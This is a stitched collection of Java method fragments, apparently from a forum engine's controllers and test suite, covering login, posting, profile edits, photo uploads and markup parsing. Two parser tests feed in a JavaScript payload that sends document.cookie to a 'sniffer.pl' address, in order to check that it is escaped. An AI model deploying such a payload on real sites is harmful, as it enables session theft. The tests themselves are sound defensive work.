public void testPostForm ( ) throws IOException { ClientResponse cr = resource . path ( " add-section.jsp " ) . queryParam ( " section " , Integer . toString ( Section . SECTION_NEWS ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . toString ( ) ) ; assertFalse ( " missing csrf " , doc . select ( " input[name=csrf] " ) . isEmpty ( ) ) ; } 
public void testPostDenied ( ) throws IOException { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " section " , Integer . toString ( Section . SECTION_FORUM ) ) ; formData . add ( " group " , Integer . toString ( TEST_GROUP ) ) ; ClientResponse cr = resource . path ( " add.jsp " ) . post ( ClientResponse . class , formData ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . toString ( ) ) ; System.out.println(doc.html()); assertFalse("not message form", doc.select("#messageForm").isEmpty()); assertFalse("missing error test", doc.select(".error").isEmpty()); assertFalse("missing csrf", doc.select("input[name=csrf]").isEmpty()); } 
public void testPostSuccess ( ) throws IOException { String auth = doLogin ( ) ; MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " section " , Integer . toString ( Section . SECTION_FORUM ) ) ; formData . add ( " group " , Integer . toString ( TEST_GROUP ) ) ; formData . add ( " csrf " , " csrf " ) ; formData . add ( " title " , TEST_TITLE ) ; ClientResponse cr = resource . path ( " add.jsp " ) . cookie ( new Cookie ( AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . toString ( ) ) ; assertTrue ( doc . select ( " .error " ) . text ( ) , doc . select ( " #messageForm " ) . isEmpty ( ) ) ; assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr . getStatus ( ) ) ; ClientResponse tempPage = resource TODO remove temp redirect from Controller .uri(cr.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_MOVED_TEMPORARILY, tempPage.getStatus()); ClientResponse page = resource .uri(tempPage.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_OK, page.getStatus()); Document finalDoc = Jsoup.parse(page.getEntityInputStream(), "UTF-8", resource.getURI().toString()); assertEquals(TEST_TITLE, finalDoc.select("h1[itemprop=headline] a").text()); } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( LOCAL_SERVER ) ; } 
public void testChangePassword ( ) { ClientResponse cr = resource . path ( " people/maxcom/edit " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; 
public String doLogin ( ) throws IOException { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , TEST_USER ) ; formData . add ( " passwd " , TEST_PASSWORD ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; System.out.print(Jsoup.parse(cr.getEntityInputStream(), "utf-8", LOCAL_SERVER).html()); assertEquals(HttpStatus.SC_MOVED_TEMPORARILY, cr.getStatus()); String auth = getAuthCookie(cr); if(auth != null) { return auth; } Assert.fail("Can't find rememberme cookie"); return null; } 
public static String doLogin ( WebResource resource , String user , String password ) throws IOException { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , user ) ; formData . add ( " passwd " , password ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; String auth = getAuthCookie ( cr ) ; if ( auth ! = null ) { return auth ; } return null ; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; } 
public void testPostSuccess ( ) throws IOException { String auth = WebHelper . doLogin ( resource , TEST_USER , TEST_PASSWORD ) ; MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " section " , Integer . toString ( Section . SECTION_FORUM ) ) ; formData . add ( " group " , Integer . toString ( TEST_GROUP ) ) ; formData . add ( " csrf " , " csrf " ) ; formData . add ( " title " , TEST_TITLE ) ; ClientResponse cr = resource . path ( " add.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . toString ( ) ) ; assertTrue ( doc . select ( " .error " ) . text ( ) , doc . select ( " #messageForm " ) . isEmpty ( ) ) ; assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr . getStatus ( ) ) ; ClientResponse tempPage = resource TODO remove temp redirect from Controller .uri(cr.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_MOVED_TEMPORARILY, tempPage.getStatus()); ClientResponse page = resource .uri(tempPage.getLocation()) .get(ClientResponse.class); assertEquals(HttpStatus.SC_OK, page.getStatus()); Document finalDoc = Jsoup.parse(page.getEntityInputStream(), "UTF-8", resource.getURI().toString()); assertEquals(TEST_TITLE, finalDoc.select("h1[itemprop=headline] a").text()); } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; } 
public void clean ( ) throws Exception { User user = userDao . getUser ( " maxcom " ) ; UserInfo userInfo = userDao . getUserInfoClass ( user ) ; userDao . updateUser ( user , 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( new UsersSectionStatEntry ( resultSet . getInt ( " section " ) , resultSet . getInt ( " c " ) ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { UserStatistics userStat = userDao . getUserStatisticsClass ( user ) ; mv . getModel ( ) . put ( " userStat " , userStat ) ; mv . getModel ( ) . put ( " sectionStat " , prepareSectionStats ( userStat ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( tmpl . getCurrentUser ( ) , user ) ) ; } if ( tmpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( tmpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
private ImmutableList < PreparedUsersSectionStatEntry > prepareSectionStats ( UserStatistics userStat ) { return ImmutableList . copyOf ( Iterables . transform ( 
public PreparedUsersSectionStatEntry apply ( UsersSectionStatEntry input ) { return new PreparedUsersSectionStatEntry ( sectionService . getSection ( input . getSection ( ) ) , 
private void rescueMaxcom ( ) throws Exception { User user = userDao . getUser ( " maxcom " ) ; userDao . updateUser ( user , 
public void initResource ( ) throws Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueMaxcom ( ) ; } 
public void clean ( ) throws Exception { rescueMaxcom ( ) ; } 
public void fixUser ( ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , TEST_ID ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , TEST_ID ) ; } 
public void testUser ( ) throws UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; assertNotNull ( user ) ; assertFalse ( user . isBlocked ( ) ) ; } 
public void testUserCached ( ) throws UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , TEST_ID ) ; User userCached = userDao . getUserCached ( TEST_ID ) ; assertFalse ( userCached . isBlocked ( ) ) ; User userNotCached = userDao . getUser ( TEST_ID ) ; assertTrue ( userNotCached . isBlocked ( ) ) ; } 
public void testCachePutOnGet ( ) throws UserNotFoundException { cache . evict ( TEST_ID ) ; User user = userDao . getUser ( TEST_ID ) ; assertNotNull ( user ) ; assertFalse ( user . isBlocked ( ) ) ; assertNotNull ( cache . get ( user . getId ( ) ) ) ; } 
public void testBlock ( ) throws UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . blockWithoutTransaction ( user , user , " " ) ; User userAfter = userDao . getUser ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public void testCacheResetOnBlock ( ) throws UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . blockWithoutTransaction ( user , user , " " ) ; User userAfter = userDao . getUserCached ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public UserDao userDao ( ) { return new UserDao ( ) ; } 
public IgnoreListDao ignoreListDao ( ) { return new IgnoreListDao ( ) ; } 
public CacheManager cacheManager ( ) { SimpleCacheManager cacheManager = new SimpleCacheManager ( ) ; cacheManager . setCaches ( ImmutableList . of ( new ConcurrentMapCache ( USERS_CACHE ) ) ) ; return cacheManager ; } 
public Cache usersCache ( CacheManager cacheManager ) { return cacheManager . getCache ( USERS_CACHE ) ; } 
private void rescueMaxcom ( ) throws Exception { final User user = userDao . getUser ( " maxcom " ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user ) ; } 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user ) ; } 
public void initResource ( ) throws Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void clean ( ) throws Exception { rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void testSimple ( ) throws IOException { String auth = WebHelper . doLogin ( resource , " JB " , JB_PASS ) ; ClientResponse cr = resource . path ( " people/JB/edit " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . toString ( ) ) ; assertEquals ( " /people/JB/edit " , doc . getElementById ( " editRegForm " ) . attr ( " action " ) ) ; String name = doc . getElementById ( " name " ) . val ( ) ; String url = doc . getElementById ( " url " ) . val ( ) ; String email = doc . getElementById ( " email " ) . val ( ) ; String town = doc . getElementById ( " town " ) . val ( ) ; String info = doc . getElementById ( " info " ) . val ( ) ; assertEquals ( JB_NAME , name ) ; assertEquals ( JB_URL , url ) ; assertEquals ( JB_EMAIL , email ) ; assertEquals ( JB_TOWN , town ) ; assertEquals ( JB_INFO , info ) ; MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " name " , name ) ; formData . add ( " url " , url ) ; formData . add ( " email " , email ) ; formData . add ( " town " , town ) ; formData . add ( " info " , info ) ; formData . add ( " csrf " , " csrf " ) ; formData . add ( " oldpass " , JB_PASS ) ; ClientResponse cr2 = resource . path ( " people/maxcom/edit " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr2 . getStatus ( ) ) ; assertEquals ( " http:127.0.0.1:8080/people/JB/profile " , cr2 . getLocation ( ) . toString ( ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = getIgnoreRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public ModelAndView showForm ( ServletRequest request ) throws Exception { return new ModelAndView ( " addphoto " ) ; } 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user ) ; userDao . unblock ( user ) ; } 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( " JB " ) ; userDao . unblock ( user ) ; } 
public void initResource ( ) throws Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueJB ( ) ; } 
public void clean ( ) throws Exception { rescueJB ( ) ; } 
public void testSimple ( ) throws IOException { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; String content = " This is a binary content " ; FormDataMultiPart form = new FormDataMultiPart ( ) ; form . bodyPart ( new FormDataBodyPart ( " csrf " , " csrf " ) ) ; form . bodyPart ( new FormDataBodyPart ( " file " , content . getBytes ( ) , new MediaType ( " image " , " jpeg " ) ) ) ; 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public ModelMap showRemove ( @RequestParam ( required = false ) Integer pos , ServletRequest request ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesRequest form = new EditBoxesRequest ( ) ; form . setPosition ( pos ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public ModelAndView view ( ) { return new ModelAndView ( " edit-boxes " ) ; } 
public static ClientResponse addPhoto ( WebResource resource , String filename , String auth ) { File file = new File ( filename ) ; FormDataMultiPart form = new FormDataMultiPart ( ) ; form . bodyPart ( new FormDataBodyPart ( " csrf " , " csrf " ) ) ; form . bodyPart ( new FileDataBodyPart ( " file " , file ) ) ; return resource . path ( " addphoto.jsp " ) 
public void testPage ( ) throws IOException { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public void initResource ( ) throws Exception { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; } 
public void test1GroupInfo ( ) throws IOException { ClientResponse cr = resource . path ( " /forum/talks/ " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; Document doc = Jsoup . parse ( cr . getEntityInputStream ( ) , " UTF-8 " , resource . getURI ( ) . toString ( ) ) ; assertTrue ( doc . select ( " .infoblock " ) . text ( ) . length ( ) > 0 ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure , false ) ; return new PreparedComment ( comment , 
private String prepareCommentText ( MessageText messageText , final boolean secure , boolean nofollow ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , secure , nofollow ) ; 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) ) { return false ; } return author . getScore ( ) < TopicPermissionService . LINK_FOLLOW_MIN_SCORE ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { UserStatistics userStat = userDao . getUserStatisticsClass ( user ) ; mv . getModel ( ) . put ( " userStat " , userStat ) ; mv . getModel ( ) . put ( " sectionStat " , prepareSectionStats ( userStat ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( tmpl . getCurrentUser ( ) , user ) ) ; } if ( tmpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( tmpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) , false ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
public String parseComment ( String text , boolean secure , boolean nofollow ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , false , nofollow ) , text ) . renderXHtml ( ) ; } 
public String parseCommentRSS ( String text , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , true , false ) , text ) . renderXHtml ( ) ; } 
public String parseForOgDescription ( String text ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , true , false ) , text ) . renderOg ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String format ( String text , boolean secure , boolean nofollow ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure , nofollow ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public void processUrl ( boolean secure , boolean nofollow , @Nonnull StringBuilder out , @Nonnull String urlHref , @Nullable String linktext ) throws URIException { LorURL url = new LorURL ( configuration . getMainURI ( ) , urlHref ) ; if ( url . isMessageUrl ( ) ) { processMessageUrl ( secure , out , url , linktext ) ; 
private void processMessageUrl ( boolean secure , @Nonnull StringBuilder out , @Nonnull LorURL url , @Nullable String linkText ) throws URIException { try { Topic message = messageDao . getById ( url . getMessageId ( ) ) ; 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false , false ) ) ; assertEquals ( RESULT14 , toHtmlFormatter . format ( TEXT14 , false , false ) ) ; assertEquals ( RESULT15 , toHtmlFormatter . format ( TEXT15 , false , false ) ) ; assertEquals ( RESULT16 , toHtmlFormatter . format ( TEXT16 , false , false ) ) ; assertEquals ( RESULT17 , toHtmlFormatter . format ( TEXT17 , false , false ) ) ; assertEquals ( RESULT17_2 , toHtmlFormatter . format ( TEXT17_2 , false , false ) ) ; assertEquals ( RESULT18 , toHtmlFormatter . format ( TEXT18 , false , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false , false ) . endsWith ( " </a> " ) ) ; } 
public void pTest ( ) { assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " test ntest1 ntest2 " , false , false ) ) ; 
public void tagEscapeTest ( ) { assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false , false ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false , false ) ) ; 
public void badListTest ( ) { assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false , false ) ) ; 
public void codeEscapeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false , false ) ) ; 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [BR] " , false , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [B]hello world[/b] " , false , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [I]hello world[/i] " , false , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [S]hello world[/s] " , false , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [STRONG]hello world[/strong] " , false , false ) ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/QUOTE] " , false , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [QUOTE=maxcom]hello world[/quote] " , false , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/QUOTE] " , false , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false , false ) ) ; } 
